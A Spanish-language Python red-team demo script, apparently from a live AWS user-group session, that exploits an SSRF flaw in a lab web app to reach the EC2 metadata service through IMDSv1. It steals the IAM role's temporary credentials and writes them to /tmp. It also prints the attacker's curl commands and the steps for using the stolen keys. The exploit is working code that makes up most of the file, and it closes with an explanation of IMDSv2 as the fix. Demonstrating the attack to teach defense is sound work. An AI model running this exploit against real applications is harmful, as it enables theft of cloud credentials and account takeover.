#!/usr/bin/env python3
"""
Paso 2 del Red Team: Explotacion de SSRF contra EC2 para robar credenciales via IMDSv1.
AWS User Group Minatitlan - Demo en Vivo.
"""
import sys
import urllib.request
import urllib.parse
import json
import subprocess
import os

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

CREDS_FILE = "/tmp/redteam_stolen_creds.json"

def get_cfn_output(output_key):
    try:
        cmd = [
            "aws", "cloudformation", "describe-stacks",
            "--stack-name", "lab-red-team",
            "--query", f"Stacks[0].Outputs[?OutputKey=='{output_key}'].OutputValue",
            "--output", "text"
        ]
        res = subprocess.check_output(cmd, text=True).strip()
        return res
    except Exception:
        return None

def query_via_ssrf(app_url, internal_target_url):
    encoded_url = urllib.parse.quote(internal_target_url, safe='')
    full_url = f"{app_url}/?url={encoded_url}"
    req = urllib.request.Request(full_url, headers={'User-Agent': 'Mozilla/5.0 (RedTeam-Scanner)'})
    with urllib.request.urlopen(req, timeout=8) as resp:
        html = resp.read().decode('utf-8', errors='ignore')
        if "<pre>" in html and "</pre>" in html:
            extracted = html.split("<pre>")[1].split("</pre>")[0].strip()
            # Decodificar HTML entities (&#34; y &quot; → comillas normales)
            extracted = extracted.replace("&#34;", '"').replace("&quot;", '"')
            extracted = extracted.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
            return extracted
        return html.strip()


def main():
    print(f"\n{BOLD}{CYAN}=== [RED TEAM FASE 2] Explotacion SSRF & Robo de Credenciales IMDSv1 ==={RESET}\n")
    print(f"{YELLOW}[*] Contexto tipico de desarrollo:{RESET}")
    print("    La aplicacion web tiene un campo para 'previsualizar URLs'.")
    print("    El backend hace requests.get(url_del_usuario) sin validar hacia donde apunta.")
    print("    Si IMDSv1 esta activo, el atacante apunta a la IP interna: 169.254.169.254\n")

    app_url = get_cfn_output("AppURL")
    if not app_url:
        print(f"{RED}[!] No se encontro la URL de la aplicacion en el stack 'lab-red-team'.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[+] Aplicacion vulnerable identificada:{RESET} {app_url}")
    print(f"\n{YELLOW}[CMD] Abre la app en el navegador para mostrar la interfaz:{RESET}")
    print(f"    {BOLD}{app_url}{RESET}")

    # 1. Consultar roles de IAM
    imds_roles_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    encoded_roles = urllib.parse.quote(imds_roles_url, safe='')

    print(f"\n{BOLD}--- PASO 1: Descubrir roles IAM via SSRF ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}curl -s '{app_url}/?url={encoded_roles}'{RESET}\n")

    try:
        roles_text = query_via_ssrf(app_url, imds_roles_url)
        print(f"    {GREEN}[+] Rol encontrado:{RESET} {roles_text}")
        role_name = roles_text.strip().split('\n')[0]
    except Exception as e:
        print(f"    {RED}[X] Error al consultar SSRF: {e}{RESET}")
        sys.exit(1)

    if not role_name or "Error" in role_name:
        print(f"{RED}[!] No se pudo obtener el nombre del rol.{RESET}")
        sys.exit(1)

    # 2. Extraer las credenciales temporales del rol
    imds_creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    encoded_creds = urllib.parse.quote(imds_creds_url, safe='')

    print(f"\n{BOLD}--- PASO 2: Robar credenciales temporales del rol '{role_name}' ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}curl -s '{app_url}/?url={encoded_creds}'{RESET}\n")

    try:
        creds_raw = query_via_ssrf(app_url, imds_creds_url)
        creds_json = json.loads(creds_raw)

        access_key = creds_json.get("AccessKeyId", "")
        secret_key = creds_json.get("SecretAccessKey", "")
        token = creds_json.get("Token", "")
        expiration = creds_json.get("Expiration", "")

        print(f"    {GREEN}{BOLD}[!!!] CREDENCIALES COMPROMETIDAS EXITOSAMENTE [!!!]{RESET}")
        print(f"    {CYAN}AccessKeyId:{RESET}     {access_key[:8]}...{access_key[-4:]} (Tipo: Temporal STS)")
        print(f"    {CYAN}SecretAccessKey:{RESET} {secret_key[:6]}... (oculta)")
        print(f"    {CYAN}Token (longitud):{RESET} {len(token)} caracteres")
        print(f"    {CYAN}Expira en:{RESET}       {expiration}")

        with open(CREDS_FILE, "w") as f:
            json.dump(creds_json, f, indent=2)

        print(f"\n{GREEN}[+] Credenciales guardadas en {CREDS_FILE} para la Fase 3.{RESET}")
        print(f"\n{YELLOW}[CMD] El atacante ahora las usa asi en su terminal:{RESET}")
        print(f"    {BOLD}export AWS_ACCESS_KEY_ID={access_key[:8]}...{RESET}")
        print(f"    {BOLD}export AWS_SECRET_ACCESS_KEY=<secret>{RESET}")
        print(f"    {BOLD}export AWS_SESSION_TOKEN=<token>{RESET}")
        print(f"    {BOLD}aws sts get-caller-identity{RESET}  <- confirma identidad robada")

    except Exception as e:
        print(f"    {RED}[X] Error parseando las credenciales: {e}{RESET}")
        sys.exit(1)

    print(f"\n{BOLD}{RED}[LECCION RED TEAM]:{RESET}")
    print("  1. ¿Que es IMDSv1? (169.254.169.254):")
    print("     Es el servicio interno de metadatos de AWS. En la version 1 funciona sin sesion:")
    print("     cualquier peticion GET simple devuelve las credenciales temporales.")
    print("     Si una aplicacion tiene SSRF, el atacante no ataca a AWS: ataca tu codigo web")
    print("     y usa tu propio servidor como puente para extraer las llaves del rol.")

    print(f"\n{BOLD}{GREEN}[LA SOLUCION TECNICA: IMDSv2]:{RESET}")
    print("  IMDSv2 exige una sesion basada en tokens:")
    print("    Paso A: Peticion PUT con cabecera 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -> obtiene un TOKEN.")
    print("    Paso B: Peticion GET enviando el token en la cabecera 'X-aws-ec2-metadata-token'.")
    print("  ¿Por que frena el SSRF? La inmensa mayoria de vulnerabilidades SSRF solo permiten hacer")
    print("  metodos GET y no permiten inyectar cabeceras PUT arbitrarias personalizadas.")

    print(f"\n{BOLD}{YELLOW}[EL DILEMA REAL EN LAS EMPRESAS: ¿POR QUE NO TODOS USAN IMDSv2?]:{RESET}")
    print("  En las conferencias se dice: 'Solo fuerza IMDSv2 y listo'. Pero en produccion real:")
    print("  • SDKs y Software Legado:")
    print("    Sistemas antiguos con versiones viejas de AWS SDK (ej. Java SDK v1, Boto 2, PHP viejo)")
    print("    no implementan el protocolo PUT de IMDSv2. Si lo fuerzas de golpe, la app colapsa.")
    print("  • Contenedores y Hop Limit:")
    print("    En arquitecturas con Docker, ECS o Kubernetes sobre EC2, si el paquete IP salta")
    print("    a traves del puente de red del contenedor y el Hop Limit es 1, el token se descarta")
    print("    y los contenedores quedan incomunicados.")
    print("  • Costo Economico vs Apetito de Riesgo:")
    print("    Actualizar y auditar microservicios de hace 8 anos cuesta semanas de desarrollo y QA.")
    print("    Muchas organizaciones prefieren asumir el riesgo residual o parchar con un WAF antes")
    print("    que arriesgar downtime en aplicaciones que facturan millones.\n")

if __name__ == "__main__":
    main()
